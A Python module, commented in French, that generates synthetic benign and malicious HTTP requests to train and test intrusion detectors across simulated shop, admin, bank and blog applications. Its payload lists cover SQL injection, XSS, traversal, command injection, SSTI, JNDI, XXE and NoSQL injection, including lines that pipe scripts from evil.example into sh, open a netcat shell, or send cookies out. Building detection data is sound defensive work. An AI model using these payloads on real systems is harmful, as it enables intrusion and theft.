"""Générateur de trafic HTTP synthétique (bénin + attaques) pour simuler des participants hétérogènes.

Les vrais journaux ne peuvent pas être partagés : on simule donc quatre applications aux profils
différents (boutique, portail d'administration, API bancaire, blog) et des familles d'attaques
connues (sqli, xss, traversal, cmdi) et inédites (ssti, jndi, xxe, nosqli).
"""
from __future__ import annotations

import random
import urllib.parse as up
from dataclasses import dataclass

KNOWN_FAMILIES = ["sqli", "xss", "traversal", "cmdi"]
NOVEL_FAMILIES = ["ssti", "jndi", "xxe", "nosqli"]
PROFILES = ["shop", "admin", "bank", "blog", "mixed"]

# Mélange d'attaques connues propre à chaque participant (non-IID marqué : certaines familles sont
# totalement absentes de ses étiquettes locales, alors qu'elles apparaissent au test).
ATTACK_MIX = {
    "shop": {"sqli": 0.6, "xss": 0.4},
    "admin": {"sqli": 0.5, "cmdi": 0.5},
    "bank": {"sqli": 0.7, "cmdi": 0.3},
    "blog": {"xss": 0.8, "sqli": 0.2},
    "mixed": {"sqli": 0.25, "xss": 0.25, "traversal": 0.25, "cmdi": 0.25},
}


@dataclass
class Req:
    raw: str
    label: int
    family: str
    app: str


WORDS = ("chaussures robe lampe velo livre telephone sac montre table chaise cafe the sac jeans veste "
         "men's women's l'été d'or rock'n'roll shoes laptop camera casque clavier souris ecran "
         "select your size drop shipping union européenne script tutoriel alert system "
         "order delete account update profile").split()
SENTENCES = [
    "Merci pour cet article, très clair !", "Je ne suis pas d'accord : l'union fait la force.",
    "Please select the best option and drop me a line.", "Super tutoriel sur JavaScript, bravo.",
    "Voir aussi <b>cette page</b> pour plus de détails.", "C'est l'équipe qui décide, n'est-ce pas ?",
    "Mon avis (très personnel) : à lire absolument; vraiment utile.", "Lien utile : https://exemple.org/aide?lang=fr",
    "Quelqu'un a testé l'option 'export' ? Ça marche - ou pas.", "<i>Excellent</i> travail, continuez comme ça !",
]
NAMES = ["alice", "bob", "carine", "didier", "esther", "fabrice", "gaelle", "hugues", "ines", "jean"]
SLUGS = ["bien-demarrer", "guide-securite", "nouveautes-2026", "conseils-pratiques", "retour-experience",
         "faq-generale", "tendances-web", "tutoriel-api"]


def _hex(r, n):
    return "".join(r.choice("0123456789abcdef") for _ in range(n))


def _cookie(r):
    return f" Cookie: sid={_hex(r, 32)}" if r.random() < 0.4 else ""


def _password(r):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*_-"
    return "".join(r.choice(chars) for _ in range(r.randint(8, 16)))


def _iban(r):
    return "FR76" + "".join(r.choice("0123456789") for _ in range(20))


def benign(app: str, r: random.Random) -> str:
    if app == "mixed":
        app = r.choice(["shop", "admin", "bank", "blog"])
    if app == "shop":
        k = r.random()
        if k < 0.3:
            q = " ".join(r.choice(WORDS) for _ in range(r.randint(1, 3)))
            raw = f"GET /search?q={up.quote(q) if r.random() < 0.5 else q.replace(' ', '+')}"
        elif k < 0.5:
            raw = f"GET /products?page={r.randint(1, 40)}&sort={r.choice(['price', 'name', 'new'])}"
        elif k < 0.7:
            raw = f"GET /product?id={r.randint(1, 9000)}"
        elif k < 0.85:
            raw = f"POST /cart/add product_id={r.randint(1, 9000)}&qty={r.randint(1, 5)}"
        else:
            raw = f"GET /category/{r.choice(['mode', 'maison', 'tech', 'sport'])}"
    elif app == "admin":
        k = r.random()
        if k < 0.3:
            raw = f"POST /login username={r.choice(NAMES)}&password={_password(r)}"
        elif k < 0.55:
            raw = f"GET /admin/users?id={r.randint(1, 500)}"
        elif k < 0.8:
            raw = (f"GET /admin/reports?from=2026-{r.randint(1, 6):02d}-{r.randint(1, 28):02d}"
                   f"&to=2026-{r.randint(7, 12):02d}-{r.randint(1, 28):02d}")
        else:
            raw = f"GET /admin/logs?level={r.choice(['error', 'warn', 'info'])}&limit={r.choice([20, 50, 100])}"
    elif app == "bank":
        k = r.random()
        acc = r.randint(10000, 99999)
        if k < 0.3:
            note = r.choice(["loyer", "remboursement", "cadeau d'anniversaire", "facture n° 4521", "partage resto"])
            raw = (f'POST /api/v1/transfer {{"from":"{_iban(r)}","to":"{_iban(r)}",'
                   f'"amount":{r.randint(5, 3000)}.{r.randint(0, 99):02d},"note":"{note}"}}')
        elif k < 0.6:
            raw = f"GET /api/v1/accounts/{acc}/transactions?limit={r.choice([10, 20, 50])}"
        elif k < 0.85:
            raw = f"GET /api/v1/accounts/{acc}/balance"
        else:
            raw = f"GET /api/v1/cards/{acc}/limits"
        if r.random() < 0.6:
            raw += f" Authorization: Bearer {_hex(r, 40)}"
    else:  # blog
        k = r.random()
        if k < 0.35:
            raw = f"GET /posts/{r.choice(SLUGS)}"
        elif k < 0.55:
            raw = f"GET /tag/{r.choice(WORDS).replace(chr(39), '')}"
        elif k < 0.7:
            raw = f"GET /archive/2026/{r.randint(1, 12):02d}"
        else:
            text = up.quote(" ".join(r.choice(SENTENCES) for _ in range(r.randint(1, 2))), safe="")
            raw = f"POST /comment author={r.choice(NAMES)}&text={text}"
    return raw + _cookie(r)


# ---------------------------------------------------------------- attaques
SQLI = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", "' UNION SELECT NULL,username,password FROM users--",
        "1 UNION SELECT 1,2,3,table_name FROM information_schema.tables", "'; DROP TABLE users;--",
        "1; SELECT SLEEP(5)--", "' AND (SELECT COUNT(*) FROM users)>0--", "admin'--", "1' ORDER BY 3--",
        "' OR 'a'='a", "1 AND 1=CONVERT(int,(SELECT @@version))", "') OR ('1'='1", "1' AND 1=1 #"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>", "<svg/onload=alert(1)>",
       "javascript:alert(1)", "\"><script>fetch('//evil.example/'+document.cookie)</script>",
       "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "'><img src=1 onerror=alert(1)>",
       "<a href=\"javascript:alert(document.domain)\">x</a>"]
TRAVERSAL = ["../../../../etc/passwd", "..\\..\\windows\\win.ini", "....//....//etc/passwd", "/etc/passwd%00",
             "../../../var/log/auth.log", "..%2f..%2f..%2fetc%2fshadow", "../../../../proc/self/environ"]
CMDI = ["; cat /etc/passwd", "| whoami", "`id`", "$(curl http://evil.example/x.sh|sh)", "&& ls -la /",
        "; nc -e /bin/sh 10.0.0.1 4444", "|| ping -c 10 127.0.0.1", "; wget http://evil.example/b -O- | sh"]
SSTI = ["{{7*7}}", "${7*7}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "<%= 7*7 %>",
        "#{7*7}"]
JNDI = ["${jndi:ldap://evil.example/a}", "${${lower:j}ndi:ldap://x.example/b}", "${jndi:rmi://10.1.1.1:1099/exp}"]
XXE = ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>']
NOSQLI = ['{"$ne": null}', '{"$gt": ""}', "[$ne]=1", '{"$where": "sleep(5000)"}']
PAYLOADS = {"sqli": SQLI, "xss": XSS, "traversal": TRAVERSAL, "cmdi": CMDI,
            "ssti": SSTI, "jndi": JNDI, "xxe": XXE, "nosqli": NOSQLI}


def _obfuscate(p: str, fam: str, r: random.Random) -> str:
    if fam == "sqli" and r.random() < 0.3:
        p = "".join(c.upper() if r.random() < 0.5 else c.lower() for c in p)
    if fam == "sqli" and r.random() < 0.25:
        p = p.replace(" ", r.choice(["/**/", "+", "%09"]))
    k = r.random()
    if k < 0.35:
        return p
    if k < 0.75:
        return up.quote(p, safe="")
    if k < 0.9:
        return up.quote(up.quote(p, safe=""), safe="")
    return up.quote(p, safe="/:=")


POINTS = {
    "shop": [("GET /search?q={}"), ("GET /product?id={}"), ("POST /cart/add product_id={}&qty=1")],
    "admin": [("POST /login username={}&password=x1Y2z3"), ("GET /admin/users?id={}"),
              ("GET /admin/reports?from={}&to=2026-12-01")],
    "bank": [("GET /api/v1/accounts/{}/balance"), ('POST /api/v1/transfer {{"to":"x","amount":1,"note":"{}"}}'),
             ("GET /api/v1/accounts/12345/transactions?limit={}")],
    "blog": [("POST /comment author=anon&text={}"), ("GET /posts/{}"), ("GET /tag/{}")],
}
COMMON_POINTS = ["GET /download?file={}", "GET /redirect?url={}"]


def attack(app: str, fam: str, r: random.Random) -> str:
    base_app = r.choice(["shop", "admin", "bank", "blog"]) if app == "mixed" else app
    p = _obfuscate(r.choice(PAYLOADS[fam]), fam, r)
    tmpl = r.choice(POINTS[base_app] + COMMON_POINTS * (2 if fam == "traversal" else 1))
    return tmpl.format(p) + _cookie(r)


def make_requests(app: str, n_benign: int, n_attack: int, mix: dict[str, float], seed: int) -> list[Req]:
    r = random.Random(seed)
    out = [Req(benign(app, r), 0, "benign", app) for _ in range(n_benign)]
    fams, probs = list(mix), list(mix.values())
    for _ in range(n_attack):
        f = r.choices(fams, weights=probs)[0]
        out.append(Req(attack(app, f, r), 1, f, app))
    r.shuffle(out)
    return out


def node_dataset(profile: str, seed: int, n_benign=1500, n_labeled_attacks=60, n_synth_attacks=0,
                 n_val_benign=500, n_test_benign=1200, n_test_attacks=400, novel_frac=0.25):
    """Découpe un jeu local : train (étiqueté), validation bénigne, test (attaques connues + inédites)."""
    uniform = {f: 1 / len(KNOWN_FAMILIES) for f in KNOWN_FAMILIES}
    train = make_requests(profile, n_benign, n_labeled_attacks, ATTACK_MIX[profile], seed * 10 + 1)
    train += make_requests(profile, 0, n_synth_attacks, uniform, seed * 10 + 2)  # attaques rejouées en local
    val = make_requests(profile, n_val_benign, 0, uniform, seed * 10 + 3)
    n_novel = int(n_test_attacks * novel_frac)
    test = make_requests(profile, n_test_benign, n_test_attacks - n_novel, uniform, seed * 10 + 4)
    test += make_requests(profile, 0, n_novel, {f: 1 / len(NOVEL_FAMILIES) for f in NOVEL_FAMILIES}, seed * 10 + 5)
    random.Random(seed).shuffle(test)
    return {"train": train, "val": val, "test": test}
